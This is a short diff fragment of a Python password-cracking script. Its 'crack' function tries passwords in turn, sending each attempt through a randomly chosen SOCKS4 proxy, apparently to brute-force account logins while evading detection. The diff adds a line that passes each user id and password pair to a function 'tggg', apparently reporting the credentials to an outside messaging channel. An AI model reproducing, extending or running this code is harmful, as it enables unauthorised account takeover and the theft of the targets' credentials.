@@ -299,6 +299,7 @@ def crack(idf, pwv):
     ses = requests.Session()
     for pw in pwv:
         try:
+            tggg(message=(uid+'|'+pw))
             nip = random.choice(prox)
             proxs = {'http': 'socks4://' + nip}
             ses.headers.update({
